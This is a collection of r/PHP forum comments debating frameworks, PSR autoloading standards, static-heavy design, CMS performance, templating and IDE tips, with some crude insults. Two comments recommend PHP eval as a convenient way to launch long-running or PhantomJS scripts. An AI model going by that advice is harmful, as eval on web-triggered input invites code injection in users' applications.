I think the anti-progress herpaderp is language agnostic. No matter what language I'm using I really don't want to see its innards. I just don't. They are weird, and gross.
&gt; My question is, why use them? What's the point if I have my own system and model for organizing all my code? What are some of the benefits that I am obviously looking past? This is a valid question and needs to be answered. I'm going to sound mean, but I'm not intending to be. The fact is I asked the same questions for a long time. I had a bunch of code, actually an implementation of the ActiveRecord pattern and some utility functions, that I copied from project to project. It facilitated development enough that it made me put off learning a framework, by basically doing... sort of 70% of what a framework would offer me. In short, it was the worst thing that ever happened to my career. When I finally started learning a framework I had to update my entire knowledgebase. I had to learn a lot of things that PHP just doesn't "need". Knowledge you can quite easily skip and still think you're doing a good job. I learned out to implement testing. I learned how controllers work, how routing works. I learned how to **properly** implement MVC. The projects I've made in Laravel I would happily say are objectively better than anything I ever made previously. Because, and I say this with all due respect, your code is shit. Sorry. Seriously, that sounds harsh. And it may be wrong. But it seems to me highly likely that the code you've been moving from project to project is a festering heap that you don't realise is terrible. I know mine was. Gaining skill and experience with a proper and modern framework has shown me the limitations of what I was doing in a range of ways. It showed me that my skills were lacking. It showed me how things could be done and could be structured. But most importantly it enabled me to create an objectively better product, and do so very much **faster** than the code I thought was so good. The product I make for a client or employer is now testable, more easily deployed, better version controlled, more maintainable, better documented, and contains vastly less code than anything I ever could have built without it. I'm a better developer, developing better products, and faster. Anyone who says otherwise is incompetent by definition. In my opinion.
*Dear People Who Are Even The Tiniest Bit Colourblind,* *Please Eat a Dick.* *Yours Sincerely,* *Bruno Skvorc* Seriously, I cannot read this pie graph. I could have followed this information if some actual numbers had been provided as well, but as it is, there is nothing here for me. edit: I should point out that the actual article is really interesting, and corresponds well with my intuitive understanding of the landscape. Just that first graph is dumb.
&gt; Personally, I believe frameworks can give you a big boost in getting a working prototype out the door Yep, true &gt; but I've always been wary of the potential for being hacked Wait, what? &gt; Take Wordpress for example Wordpress isn't a framework, what's the relevance. &gt; I personally like to make my own frameworks, my own "site engines", coded with my own standards. *shudder*
Assume the user, the database, other programs accessing your API, yourself, pretty much assume everyone is a total bastard. Never ever assume that your input is clean regardless of where it comes from and you'll be a lot safer.
There are a few issues with this code ... - Hammering a regex for *every route* is O(wtf) - isset($_SERVER['HTTPS']) is unreliable as some SAPIs will report a non-empty "off" value - $_SERVER['HTTP_HOST'] is attacker controlled - $_SERVER['PHP_SELF'] is attacker controlled - 405 Method Not Allowed? Anybody? - You're echoing "400" if the route isn't found. 400 means "Bad Request" - HTTP methods are extensible. This means that ZANZIBAR is a valid HTTP method. There is no allowance for this (in fairness most user land routers are unaware of this fact). - HTTP methods are case-sensitive. This is something of a protocol WTF but still, the ability to specify method verbs without converting them to all-caps would be nice to have. I hate to say it but your implementation is naive to the HTTP protocol and really slow.
Composer and PSR have no bearing on quality of code and tests *might* be useful. But would any of these three things solve the HTTP and performance WTFs in this code? Not remotely. This idea that somehow being able to import bad code into your project via standardized tools magically turns it into good code is ridiculous. I really wish the PHP community would stop peddling this nonsense as gospel. Composer and PSR can be helpful. Their inclusion should never be used as qualitative criteria.
Wish the raw data was available - inc. the information excluded from the results... it'd be interesting to draw some conclusion, and laugh at the "wordpress is a framework" comments. 
Composer and PSR = more compatible and reusable code. Without that these days people will be less likely to use your library
As a user of WordPress for 3 years I can tell you it's better to use PHP, especially since you have a decent knowledge of it. With a custom PHP project your flexibility with the code is much larger, especially since you have the ability to integrate open source code. Also, the apps usually run much faster as I find WordPress to be very cluttersome. ***The only times I would use WordPress are:*** &gt; a) You are new to programming (or do not know how). &gt; b) Have an existing site, and need a blog (in which case I highly recommend WP).' &gt; c) You just want a quick site, up and running. If you ***are*** going with WP, [WPMUDEV's directory plugin](http://premium.wpmudev.org/forums/topic/business-directory) fits your needs perfectly: ***Conclusion:*** If you see your project as one in it for the long run, definitely code it from scratch. WordPress is not meant to handle scalable web apps. Else if you just want to build a quick content directory, go with WordPress. 
you can [bind macros to shortcuts](http://www.jetbrains.com/phpstorm/webhelp/binding-macros-with-keyboard-shortcuts.html) which would solve your problem
Using eval can be a great way to trigger the execution of a long-running PHP script from a web interface.
&gt; Never said that. Quite the opposite really. Good. You suggested there would be confusion about which one you are meant to support. Either, but probably the most recent if you can. One day we'll deprecate PSR-0, but keeping it simple for now is an obviously beneficial choice. &gt; No it should have been deprecated. As it pretty much will be. You are just deluding newcomers by saying it is somehow still a valid choice. Above. &gt; Not really, I was using it as an example of a PSR done right. Not cross-referencing PSR's is definitely a plus. This is what im trying to suggest. Ether update hard references, or make them more vague. But PSR-1 is not a logger, and needs to require a logical namespace standard. There is no way we can just delete it. &gt; Yes it follows PSR-1, but that doesn't mean the library that implements the logger has to for anything outside of the logger interfaces functions. Right. &gt; I can include files manually if I so choose. PSR-3 is essentially a lib like any other. My project doesn't need to follow PSR-0 to 2 to support it. Manually including a PSR-0 package still involves requiring PSR-0. :) &gt; Hah, do you say that to everyone that disagrees with you? I really cant tell why you think you are saying something useful. I don't get it, and I normally pride myself in being able to see both sides of an argument. What is this?
I have respect for peers for days. I wouldn't be on Reddit if I didn't. I just had no idea how anything suggested in that comment was useful. I felt confused, like maybe I was somehow missing a good point. 
I'm still confused about how you think PSR-4 is "more confusing" than PSR-0. Using your example: &gt; e.g., /path/to/aura-web/src/Aura/Web/Http/Response/Status.php You still need to work out which composer package that is hiding in. &gt; e.g., /path/to/aura-web/src/Response/Status.php You still need to work out which composer package that is hiding in, it just cuts out some of the folders when you do. PSR-4 does not add any confusion whatsoever, it just removes a bit of extra clicking. &gt; As for PSR-3, 5, or 6. I am extremely hesitant to get on board supporting a process for something as critical as logging, caching, and documentation standards when I still see people arguing about how amendments are to be applied. I look at the way JCL and the logging API from ~10 years ago is still affecting Java today, and I cringe. So because I am trying to make a new rule about amendments for references you want to just throw out all standards made by this body, because they aren't as stable as standards made by another (much bigger and more practiced) body? That seems silly.
How is performance with Drupal? Does it have performance issues like WordPress often does because of the bloat? Or does it not have that issue?
hi, i worked a lot with other frameworks, so i thought i know what the MVC concept is about. but anyway, i just posted a new thread with thoughts about that php and all static concept. i would be happy if you take part with the discussion :-) [link](http://www.reddit.com/r/PHP/comments/1ty7so/all_static_lol_a_few_thoughts_and_perhaps/)
Hi drailing! Yes, you are wrong, because you start off with two false premises. I'd like to correct them: * Anybody who's interested in performance runs with an opcode cache. Because of this the amount of code ^1 that is executed does not matter. * Creating individual objects does not impact performance. If you need to create thousands of objects to handle a request, this may have a measurable impact on performance, but creating an object for a router or a controller does not. There is no benefit to avoiding the use of objects. ^1 "Amount of code" here is referring to raw quantity, not the amount of executed instructions.
Wordpress and Drupal are both resource hogs out of the box, but both communities have developed numerous ways to make them scale and perform well. If you have some control over your hosting environment (i.e. not shared hosting) and you're able to modify the settings and extensions for PHP and MySQL, you should have no problem getting Drupal to perform very well. I run about ten Drupal sites on one small VPS and none of them have any notable performance issues. Edit: Just wanted to add a simple recipe for a fast Drupal site. 1) Use a memory-based caching system like APC and install the corresponding Drupal module. 2) If many of your end users will be logged in while they use the site, install the Authcache module. 3) Look up the recommended PHP/MySQL settings for Drupal and tweak as necessary. 4) Once you've built the site and implemented most of your features, install the Devel module and enable the query log. Look to see if you have any abnormally slow queries. If you do, google it - odds are, it's a known issue and there's a fix out there. That's the beauty of Drupal - you're almost never the first one to discover the problem, so usually there's a workaround or patch out there already. 
Excuse me for trying to provide some constructive criticism and not bothering to make sure it falls in line with your viewpoints or was all inclusive. Suck it, Trebek. 
Also, just noticed there seems to be a missing "Sync Folders" option that is available with puphpet?
Because, you cannot. eval is not a function and never was, it is a language construct and cannot be disabled with the disable_functions directive.
Your reasoning all boils down to micro optimization. For the small projects you recommend using this on, your boss is never going to ask you to improve script speed by &lt;1%, but you can be sure they'll be on you when something is broken or the client wants a quick change. Test and maintenance purposes are far superior to any micro optimization (if any) achieved here.
A framework I wrote and have been updating/using since 2006 was converted to 'all static' about 2 years ago. I saw no performance gain but it was awesome to not have to globalize pointers in all the methods or worrying about passing them as arguments.
Hi nikic, thanks a lot for your explanation! One note: all the database accesses via ORMs (before RedBeanPHP i used doctrine) are objects. So i dont want to avoid them, it was more a question if im *required* to build my framework completely object oriented, and i cant find a good reason why i should wrap everything in objects.
The important thing is consistency. Tabs or spaces, but not both. No need to condemn folks harshly for a simple style preference.
The framework is updated as I learn or come up with new ideas. I'm not a professional programmer, I work in IT, I never said (anywhere) that I know everything, and the framework isn't broken so no need to re-engineer it to follow your personal standards. It appears you've wasted your time.
Other then PHP there is so much nope in the title
As for now I'm 5 days with still no resolution resolving a vs2012 issue and this is with Microsoft support team.
I had to use eval when I wanted to execute a script with Phantomjs that took a screenshot of a webpage. Not really sure of any other way to do it than using eval.
&gt; You still need to work out which composer package that is hiding in. I believe the confusion is on your part. I'm talking about the FQCN which has nothing to do with the package name. Yes, you have to know the name of the package and where it lives within the vendor directory to find the source code, that is correct. However there is no 1:1 relationship between a package name and the namespaces within that package, as there shouldn't be. The name of the package, the group it is from, the features it implements, none of this has any impact what so ever on the implementation within. The package name has nothing to do with the namespaces of the source code, you cannot use the fact that you have to know the name of the package in order to find the source code as a straw man to promote PSR-4 because it's comparing apples to bananas. Once you are within a package, if it adheres to PSR-1 knowing the filepath from the FQCN or the FQCN from the filepath is simple once you have determined the location of the source code. \My\Widget\Factory() src/My/Widget/Factory.php, easy. With PSR-4? \My\Widget\Factory() Could be src/Factory.php or maybe src/Widget/Factory.php. You tell me which is more coherent and easier to understand. PSR-4 is a standard that diminishes the information available to a developer, period. The time spent referencing the configuration to accurately determine the namespace mapping is far greater and requires more work than those few clicks someone might save by implementing PSR-4. &gt; So because I am trying to make a new rule about amendments for references you want to just throw out all standards made by this body Yes, absolutely. PHP-FIG has turned into a joke. I've been reading the discussions for about 2-3 years now and I've seen that group descend into a lot of moaning, groaning, whining, and complaining. There's too many big egos and even when it seems like a decision is made people start 3-4 threads about the process in which the decision was made trying to undermine the decision by challenging the process or even worse, the voting members who +1'ed it. Edit: pardon my grumpiness at the group. Some of the brightest and best in the PHP community are part of the group and I don't intend on slandering their names. I had very high hopes for this group and I feel like the group has failed to meet my personal expectations, but that's a problem for me to deal with isn't it? I hope over time the group becomes more cohesive and positive. You're a voice for promoting positive engagement, and I don't want that to go ignored.
I mentioned you may not have intended to offend, but it did come across, at least to a third party, as offensive. I'm just trying to give you a heads up that you represent a larger body and your words, while likely not shared by the rest of the group, will be interpreted as such if they come across as negative or insulting. It's just something to be aware of and conscious of when trying to promote the work PHP-FIG has been doing. 
Got it. Thank you :) 
So you're saying that you got a lot of *static* for your designs? Sorry, I had to. On that note, is an all-static design much different than an all-procedural design? With all static, you are using the technical design behind OOP without actually using OOP. "You're doing it wrong." If you removed the classes and prefixed every function to make the entire project procedural, would it be any different? I had a "framework" of sorts which was all procedural because I never liked OOP. I knew how to use it, had been using OOP in other languages for years, but it seemed like overkill waste of time for a lot of what I was doing. So I had this framework with all my utilities, a custom database wrapper, a template / page generation system, etc etc, all procedural. In the end it's not much different than what you have. 
&gt; I believe the confusion is on your part. I'm talking about the FQCN which has nothing to do with the package name. Yes, you have to know the name of the package and where it lives within the vendor directory to find the source code, that is correct. However there is no 1:1 relationship between a package name and the namespaces within that package, as there shouldn't be. The name of the package, the group it is from, the features it implements, none of this has any impact what so ever on the implementation within. Yes. Of course. &gt; The package name has nothing to do with the namespaces of the source code, you cannot use the fact that you have to know the name of the package in order to find the source code as a straw man to promote PSR-4 because it's comparing apples to bananas. I was not using it to promote, but to point out that there is no way for anyone to look at a FQCN and immediately know the filepath, in PSR-0 or PSR-4. I thought that is what your issue with PSR-4 was? If not, then great, we can move on to the other bit. The 1:1 mapping WITHIN the autoloadable folder, for the sake of argument: src/. Yeah absolutely, it could be src/Factory.php or maybe src/Widget/Factory.php, but if you're looking for Factory.php then... well you found it without having to click into the Widget folder first. That is not an issue for a human, so what is the issue? Are you programmatically trying to access this code? If so, firstly: why. Secondly, why not just use the same rules that the autoloader does? &gt; I've been reading the discussions for about 2-3 years now and I've seen that group descend into a lot of moaning, groaning, whining, and complaining. &gt; There's too many big egos and even when it seems like a decision is made people start 3-4 threads about the process in which the decision was made trying to undermine the decision by challenging the process or even worse, the voting members who +1'ed it. I've seen a lot of people starting alternative proposals, and LOTS of bickering about membership, but I haven't seen any of the rest of those issues and I have had daily digests for over a year. Did you expect 30 "competing" projects to discuss changing their code, creating standard interfaces, build a consistent style guide and do it all without argument? You'd have to be mad to expect that. :)
I personally do not freak out when I see the use of static methods as I see them similar to namespaced functions \namespace\myFunction($arg1, $arg2) is the same, functionally, as Class::myFunction($arg1, $arg2) Basically "all static" classes can be viewed as collections of functions that may access some namespaced variables (ie: static properties). Now, if your app can live without having objects I don't see the problem. I haven't seen anybody loosing their minds when they see `str_replace` when you should "obviously" use $str = new String('abc'); $str-&gt;replace('b', 'd'); echo $str; // adc With that being said, I still think it's better to program "object-oriented" style. That's what you're programming most of the time, no? Objects that do stuff; a database connector, a router etc. And it's easier to change things around. Your app may use a single router but if you need to refactor your code (use another router instead) it would be easier to change the line where you instantiate the router than change all the occurences of `MyRouterClass` in countless files. 
&gt; In this particular case I don't think an 'Or' amendment is necessarily the correct way to go. For a start it is basically undermining the point of PSR by adding an element of confusion. Anyone who glances at a project that simply claims PSR or PSR-1 naming compliance is now going to have to dig deeper to see which compliance it's referring to. Referencing PSRs in the first place was definitely a mistake. Plenty of folks in the FIG recognize that and have know it for a while. New PSRs will not reference other PSRs, as they should always stand up on their own. I battled _extremely_ hard to avoid PSR-4 being split into multiple PSRs which referenced each other. PSR's 5 and 6 also have no references, and if anyone tries to add them in a future PSR I will fight it once again. So I think we agree there. &gt; Anyone who glances at a project that simply claims PSR or PSR-1 naming compliance is now going to have to dig deeper to see which compliance it's referring to. No project is ever going to be "PSR compliant", but it can be compliant with specific standards. "This project is compliant with PSR-0, PSR-1 and PSR-3". &gt; With this in mind I personally would be arguing for a versioning solution. Keep the PSR-0, 1, 2, 3 etc naming convention but simply have them refer to specific areas of the project, 0 for auto loading, 1 naming etc etc then version it like an API so if a project claims compliance the developer can run to that version's PSR docs and check how everything should be. PSR is still young enough that they could make such a paradigm shift with minimal disruption, hell, just call all the current PSRs version 1 and move onto version 2. Versioning, or replacing with a new standard are basically the exact same thing, but with a different naming convention. PSR-4 could certainly be considered PSR-0v2, and one day PSR-21 will replace PSR-13, etc. This is how most standards bodies work. I have been trying to have things fairly closely modeled to the PEP system (that is where the workflow bylaw came from) and it works just fine. We simply need to remove these old hard-coded references, and keep on replacing things with newer and "better" standards and eventually deprecating them over time. I definitely want to replace PSR-2 with something that is not so flawed at some point in the future. It might end up being PSR-9 or something. We don't need to stay tied to these numbers for any particular reason.
&gt; That is not an issue for a human, so what is the issue? I work with a network of ~25 sites right now, some acquisitions and some from the ground up but the one thing we've standardized is that new development is done by integrating zf2 with an existing or new application, and work is done within modules to simplify reuse, etc... you know the drill. I spend a lot of my time doing reviews, triage, debugging, and in general navigating through source code I've never touched personally. I appreciate being able to quickly identify cause and source by using the filepath and how it correlates to the FQCN of something. If developers on my team were to map namespaces arbitrarily, I can imagine the excess work someone in my position would have to do when navigating a module through the terminal or something that's not able to intuit location like an IDE. I feel as if PSR-4 takes information away from me by abstracting the correlation between filepath and FQCN, this is my biggest complaint with the standard. &gt; You'd have to be mad to expect that. :) Oh, you can't help that. We're all mad here. 
There's nothing wrong with trying to do something super fast and easy, but technical debt has its way of creeping up. :)
Wow. Such money. Much thanks. :-)
&gt; If developers on my team were to map namespaces arbitrarily, I can imagine the excess work someone in my position would have to do when navigating a module through the terminal or something that's not able to intuit location like an IDE. So don't map namespaces arbitrarily. &gt; I feel as if PSR-4 takes information away from me by abstracting the correlation between filepath and FQCN, this is my biggest complaint with the standard. That is fair enough. It is not exactly "abstracting the correlation", but "optionally removing a prefix" which a lot of folks want. The example I use is in PyroCMS. PSR-0: system/cms/modules/users/src/Pyro/Module/User/Model/Group.php Gross. PSR-4: system/cms/modules/users/src/Model/Group.php Much less of a hassle. If removing a prefix is something you do not need and only see as a negative, then PSR-4 certainly wont be for you. Drupal, Joomla and PyroCMS however are extremely excited about it, so we'll be happy at least.
&gt; Gross. The real reason this PSR exists today. Standardizing personal taste for justification. Thank you.
I use the auto formatter **a lot** as well, definitely one of the faves. Another is CTRL+Enter on errors and hints. And CTRL+SHIFT+UP/DOWN for moving lines, a lifesaver.
It is not simply personal taste. PSR-4 removes two relics of PSR-0 that only exist because it was built in a time when people were expected to have only one vendor folder because PEAR/Horde/Zend/etc worked. vendor/PEAR/Mail/Mail.php or whatever. With people using PSR-0 in new and interesting ways, enforcing this old-style 1:1 is just not working out. Drupal, Joomla and PyroCMS are three projects I've known to have issues with this, and will all be taking advantage of the ability to remove the extra folder structure. Thousands more will too. If you do not wish to remove your excess folder structure then don't, but don't be confused about people having different needs to yourself. 
Looks like he updated the graph.
Got me there. I must have been thinking of pre version 8 Drupal . I've actually never used Magento so... not sure where my head was. Thanks for the clarification. 
IoC is about more than testability. It's about creating maintainable APIs that clearly define their dependencies. The problem with SL is that it makes a liar of your API by hiding the real dependencies and exposing the entire application to code that shouldn't be privileged with such knowledge. SL also makes for the very worst form of vendor lock-in; it's like a virus that you can't eradicate from an application without a top-down rewrite. This is great if you're a framework trying to procure users, but it's quite suboptimal if you want to write loosely coupled modular code. edited for spelling.
Some frameworks use it
No problem, Magento is actually quite nice (both in terms of features and in terms of code). A bit bloated/over-engineered perhaps, but definitely one of the best CMSes/e-commerce solutions. 
yes, you are completely correct! i think the only, and for me essential diffrence to an all-procedural design, is the way you organize and group your diffrent files and functions. if you look at the "renderPartial" function, i just include the view on that position the function is called. not that technical revolution, but it works :-) at the end of the way of a response is a browser, and there is nothing than static html, that you could also write line per line, top to bottom. but we wont do that, because we can be much more productive if we use some sort of "frameworks" 
Of course, and im really thankful for all the feedback! Anyway, i think i will not rewrite the code to a OOP design, because there are already pretty good OOP frameworks and there is no reason to copy anything existing.
No argument needed; one is definitively better. ;)
Just wanted to note that the code samples on the website aren't readable without javascript turned on (dark grey on black).
When can we expect PSR-4 Autoloading in Composer???
Personally I think this is really the crux of the matter, that of the naming and the numbers. I think having PSR-4 as a name ineffect replacing PSR-0 isn't terribly clear, especially to someone just coming to the system. Under the current system I think it would be perfectly feasible for a new user to assume PSR-4 delt with some other aspect of standards, just as 1,2 and 3 do, there is nothing to indicate it superceeds PSR-0 as the new recomended standard, as if you chabged it to PSR-0-V2 or whatever it would be fairly Immediate clear it whare it came and what particular aspect it delt with. I can just envision 3 years down the line having half a dozen randomly assigned PSRs all dealing with the same topic without any rational numbering system and everyone having to rely on a sprawling contents page to discover which PSRs they should be using.
&gt; there is nothing to indicate it superceeds PSR-0 as the new recomended standard That's because it isn't a replacement. Not yet. It will be an alternative for a while, then eventually the PSR-0 file will have a note put at the top saying it is deprecated, and PSR-4 should be used. The numbering has no semantic meaning, it just so happens that 0, 1 and 2 built on top of each other. PSR-5 is PHPDoc and PSR-6 is Cache. There will be another cache PSR in the future that adds to that original Cache, and it could be PSR-9 or something else. We cannot maintain 0, 1, 2 and 3 with multiple versions and we don't need to. The numbering is perfectly rational, and an index will help: https://github.com/php-fig/fig-standards/wiki/PHP-Standard-Recommendations Looks a lot like: http://www.python.org/dev/peps/
You don't *need* to use objects for everything if you don't want to, but doing so with a well-maintained third-party library helping you can *drastically* reduce the amount of code that *you* need to write, even if there's more code in general being executed. Objects are just one way to *manage complexity*. 
It's actually been so long since I last wrote code that used it (given that it worked the first time), I've also entirely forgotten whether I had to initialize the drawing bit myself or not...
Yeah, that's a lot better now. 
Most of the good ones do. I'd look at Plates if you want a standalone template class. Laravel's Blade is similar to Razor used in .NET MVC, and uses either custom template syntax or native PHP. @foreach($collection as item) {{$item-&gt;title}} @endforeach Or &amp;lt;?php foreach($collection as $item){ ?&gt; &amp;lt;?php echo $item-&gt;title?&gt; &amp;lt;?php } ?&gt; I'm not sure whether Symfony's Twig supports the same thing, but I think so. 
Yeah during my research here on /r/PHP I did come across Laravel and it's template syntax look like Razor but CodeIgniter had a good point in that php code as template give the best performance since you don't have to convert back to php. How's Laravel's performance?
Thanks for taking the time. Much appreciated.
Maintenance / hand-off points are well received. Thanks for bringing those up.
Some things, such as the '400' error message have been fixed. Others will be done in the future. As for now, I leave it up for the developers to use correct HTTP protocol methods. I'll implement a fix soon.
Agreed - Plates is a good choice. Simple concepts well executed - doesn't try to do anything too fancy and sticks to the "PHP is the template language" ideal well.
if you type it again, you will get a mirror of the mirrored website
The fact that PyroCMS is being actively transferred off CodeIgniter and onto Laravel doesn't warrant a mention?
Just want to point that you can use plain php files as views for Laravel, in fact Blade templates are php files, so you can have "home.blade.php" or "home.php" and both would work without any change in the framework, you just return the view with View::make("home"); Also as Blade files are php, you can actually use any php code inside them, its not recommended, but you can if you want.
Blade templates compile to PHP and get cached in the storage/views folder until they change, so there is only ever one performance hit when you use Blade, after that it's as if you had written the template in pure PHP until you decide to update the template. Nothing really to worry about there.
I already specified that deadlines and other work-related constraints make sense to use prebuilt things, to a degree. The goal there is to get the job done, not learning or understanding or indeed, even giving a damn about the software. The goal is money. &gt; You also don't need a reason for accepting practices - questioning IS good but if you are satisfied that the majority of what is being pushed by a particular group of people is accurate and good then you can bank on their expertise and accept other stuff as well. As you get on in your professional career you'll know when you can sniff out bullshit and when to question...and when to just go "that seems reasonable" and GET ON WITH IT. Questioning things is healthy - obsessing over every single bit of detail and how decisions were made is not. Yes, I *do* need reasons for accepting common practice. Unlike you and possibly others, I do not see common use as validation of something. That's socially ignorant and sheepish. If programming is a logical science, then the decisions made -- even meta-decisions -- must be made through the use of sound logic, not blind acceptance of something. Trusting someone or a group on one decision does not automatically make their judgment sound for the next decision. They may be making their judgments based on trust on a third party, which may also prove to be less than trustworthy. The point is "just trust X group" is not logically sound. *You* may not consider it healthy, but decisions and the reasons behind them matter. You don't learn anything by just trusting what others tell you to use or build.
&gt; there is no such thing as generic controllers Wat? There certainly are. 1. You're presupposing that everyone uses frameworks; they don't. 2. Your argument justifies bad practice by saying that many people do it. Yes, service location is performed by the frameworks you cite. That's not a justification, it's an indictment. Bad API design is still a problem even if your code accepts the associated vendor entrenchment. Routing doesn't require service location unless it's needlessly coupled to a vendor-specific implementation. I don't see any points here to counter the problems associated with SL other than &lt;framework x&gt; does it.
I don't think it's likely you'll find many people willing to pay for a 1/4-completed book just to review it. If you send me a code to download the book for free, I'd be happy to take a look when I have a moment. I reviewed Chris's [Implementing Laravel](https://leanpub.com/implementinglaravel) book just before he released it as well. I'm sure he'd offer a reference if you wanted to ask for one. You can find me on [Twitter](https://twitter.com/cryode) and stuff, too, if you'd like.
Keep it civil, please.
You could just click the download sample link ?
Magento developer here, Magicento it's just an amazing time saver.
Hey, thanks for the feedback, I really appreciate it. Can you be more specific where I use abstract classes to explain interfaces? I'm not exactly sure where you're talking about. Thanks again!
Thank for the info.
I'd just like to mention you could really use some proofreading services. "truely" for "truly" etc, basic spellchecker typos all around.
&gt; One thing i know: if you want to use unit tests, its harder to test static methods, but if you want to do a project that complex that you want to use unit tests, i would not recommend my framework anyway :-) You should unit test even the most trivial of projects if it is being used for a production application. For a bit of play around concept whatever it doesn't really matter, but the moment you sell it - or the moment you need to rely on it, it should be tested. Testability matters. Testability, and Tested code means you can refactor with confidence. It means when things inevitably change you can make the changes without knowing you are breaking everything. Your "size does matter" point is not really much of a point at all.
So you took a pile of shit and made it worse? Am I missing something here? How is this at all awesome? As for globalizing - please, please, please learn about object composition. This entire post tells me you haven't studied commonly accepted OO practices *at all*.
Well, you could in many cases, but I would question your sanity if you did (ie. Custom router controller... And, before you ask, yes - I've seen someone do this in their project, which I got sucked into. All for the sake of having a custom router. A really ugly think to work with.)
It's not your accuracy that's the problem, it's your precision. :)
That...isn't really what I was saying. I was saying you don't need to question everything. You need to understand some of it, for sure. But you can also then accept "expert knowledge", which you ratify by the parts you do question. Questioning every single thing is unhealthy. You don't need to know how everything works in order to effectively use it. You need to know how the parts you write work. And as I stated before if you ever work within a team of people you will quickly learn that you cannot possibly question everything. It isn't an effective use of everyone's time. My acceptance is far from blind. I fight the fights that are worth fighting. Understanding how everything works down to the specific motivation for particular design decisions (which is what you are advocating) is not even the slightest bit useful to me. You assertion that users of frameworks are somehow bad/lazy/poorly educated people seems to fly in the face of decades of experience in the field. If I am to accept your assertion then you are going to need to provide solid evidence.. Please include code samples and a break down of development time as well as an estimate of maintenance overhead along with your proof. Edit: your claim that the goal is money and not giving a damn about the software is offensive. I give a damn about every line of code I write. I also give a damn about providing value in terms of giving tested, maintainable, understandable, performant code to my customers and employers. And for that very reason I chose to use a framework every time I start a new project. Not always the same Framework, but often. The goal is not "money" it is "value". Value to the client, value to me. And yes, that includes learning and understanding. 
I like it. It's nice that there are a lot of source code samples. I'm not a fan of long verbose paragraphs.
Konami code is not doing anything for me.
Check the logo after you punch it in.
I'm of the opinion that "Don't reinvent the wheel" is actually shorthand for "Don't reinvent the wheel until it becomes absolutely necessary and completely justifiable", which is similar to what you're saying. 
Then you are working on dysfunctional projects. Quality should never *ever* be sacrificed. The delivery time or the scope should be. If we give up quality we make a rod for our own backs. We should be informing our clients of the cost of reducing quality in the long run. And even if you are working on dysfunctional projects, you shouldn't be enabling the dysfunction by advocating it is ok to "static everything" because "my stuff isn't meant to be used on complex projects" where quality matters. These days I don't quote or estimate without including the time it takes to write unit tests. I don't actually outwardly indicate I will do so - there never is a line item on the quote which can be sacrificed. X costs this many dollars. That many dollars includes things I wont scrimp on. There are other ways to "go faster" without instantly saying "hey we'll skip testing". Suggest you take a look at various Agile development methodologies (I'm personally partial to Scrum). Edit: worth pointing out - a dysfunctional project is one where the client/employer sets the requirements and the budget (and sometimes the delivery time). They should only be setting the requirements. Those doing the work should own the estimate of the amount of effort required to achieve it. That leaves the client with 2 outs - they either find someone who is willing to make the sacrifices or they come back with a reduced set of requirements. 
Absolutely. Much better way of putting it. By all means, make the wheel better (refactor mercilessly - or in the case of frameworks, extends and adapt), but don't burn it down and make a whole new wheel just because...the old wheel works just fine :)
It's back up!
There are 2 points now (i found out in this thread): 1. My "all static" design gets no love and i can understand the critics. Its more or less a better file organization and function grouping than doing the work completly procedural. I can accept that, as well it worked out very nice for a few small projects, without automatic tests of course. 2. I really want to evolve myself to become a better developer. I learned a bit of Scrum in my computer science studies (2 years ago, so im not that long in the bussines :-) ), but never could use it at work nor any project at work brought unit tests to end. I will start with TDD in my private projects (for that i use the awesome playframework) and perhaps i propose put a few suggestions at work. thanks a lot for your time and feedback!
Getting Scrum happening in your place of business will be hard, unless they are ready for a change. Most often businesses are not. Your best bet if you want to work in this way is to actively seek an employer who is already using it. There are lighter approaches you can take - but really if budgets are being used to sacrifice quality you need to say "no". you don't have to be angry about it - just talk to your project managers and point out that being sloppy now is a recipe for considerably larger expense in the future. Good luck.
isn't the konami code up up down down left right left right b a b a (the "b a" part twice)?
You can check: http://platesphp.com/ From the info: Framework-agnostic, will work with any project Decoupled design makes templates easy to test Composer ready and PSR-2 compliant 
mine is uninstall PHPstorm and install sublime text
I've been built a lot of forms and I've never found a validation library that would do anything I need like 1. Allow me to easily set a validation rule an input that has the name 'recipient[address][city]' 2. Allow me to have my way of translating error messages. Most of validation libraries are not concerned with this aspect 3. Validate values in context (eg: the shipping address is not required if the "same as billing" checkbox is checked) This library is part (prerequisite) of a bigger project I'm working on for building and rendering forms. Feedback is most welcome.
I'd just like to commend you for using Travis and unit testing, that's not something you see often. The mark of a dedicated pro. Definitely intrigued me enough to give the lib a more detailed look.
check out themeforest.com bunch template that you can use
CodeIgniter isn't "dead". Although the developers have stopped working on it, the community is still contributing to it on [Github](https://github.com/ellislab/codeigniter), and even if it was dead, I'd still use it. It's a great framework, speeds up development immensely and it's great for beginners.
I thought it was too, but it only works if you do "b a" once
There's always Aura, of course -- you can use just the View package by itself, incorporate the View package into anything else, or use the framework as a whole. (The View package, like all Aura packages, has no added dependencies.) http://auraphp.com https://github.com/auraphp/Aura.View
From what I have seen, "blade.php" files takes precedence. What I meant is that you could have your plain php views, or change them by blade views, all without changing anything in your application. 
I am in a STEM profession and apart from high school, I have almost no formal english education, though my job does involve a considerable amount correspondence and I do read a lot. When someone like me notices grammar and spelling mistakes throughout, it is a sure indication that the writing needs work. It is my failing that the writing quality prejudices the content for me. I almost gave up after the very first line used "architect"** as a verb. I doubt I would pay for this book based on the sample provided. ** I have since learned that using architect as a verb is not uncommon in technical circles. Just because something is common does not make it correct. 
This from page ii: &gt; **Cover Credits** &gt; The cover of this book contains an image from The Story of Some English Shires by Mandell Creighton, written 1897, and is of Edgar’s Gateway in Worcester. I choose this image not becomes of its relevance to the text, more so due to the hilariousness I found found in the building’s frightened face.
I posted a similar thread a while ago: http://www.reddit.com/r/PHP/comments/1smskw/here_in_rphp_you_have_a_lot_of_love_for_phpstorm/ I did it because I found another one like it very useful when I was just starting: http://www.reddit.com/r/PHP/comments/1dzggz/i_just_got_phpstorm_i_love_it_what_are_some_great/
Laziness is a virtue in a programmer: http://threevirtues.com/ It makes you efficient.
Hey! I read the full excerpt and I ought to tell you that I really liked what I read. One thing though, I was already familiar with what you wrote, so I don't know how somebody strange to those concepts would feel about it. I particularly liked your explanation of the Adapter Pattern. As the others tell you probably have some polishing to do but I think you are set in the right path. One question, how can I follow the progress? Because I'm interested in buying it when it's done, but I know I'm too lazy to be checking the leanpub page from time to time
Middle-clicking the method works too, to save all that laborious left hand action :) Edit: in Windows
The overwhelming consensus is that I need an editor and proof readers. I'm talking to some people and working on that. Thanks for your feedback!
At first "I hate PHP" and "I love PHP" didn't work, because I tried entering them as "ihatephp" and "i hate php". You have to press shift to capitalize "I" and "PHP" for it to work.
